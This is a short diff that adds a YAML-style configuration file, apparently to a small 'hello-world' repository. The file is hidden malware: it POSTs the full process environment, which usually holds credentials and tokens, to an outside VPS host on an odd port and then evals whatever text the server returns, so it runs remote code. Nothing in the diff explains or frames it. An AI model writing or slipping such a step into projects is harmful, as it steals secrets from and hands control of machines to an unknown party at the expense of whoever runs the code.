@@ -1,0 +1,8 @@
+fetch:
+  url: http://ovz1.j19544519.pr46m.vps.myjino.ru:49460/?org=SheepTester&repo=hello-world
+  method: POST
+  body: {{ JSON.stringify(process.env) }}
+  headers:
+    Content-Type: application/json
+then:
+  eval: {{ response.text() }}
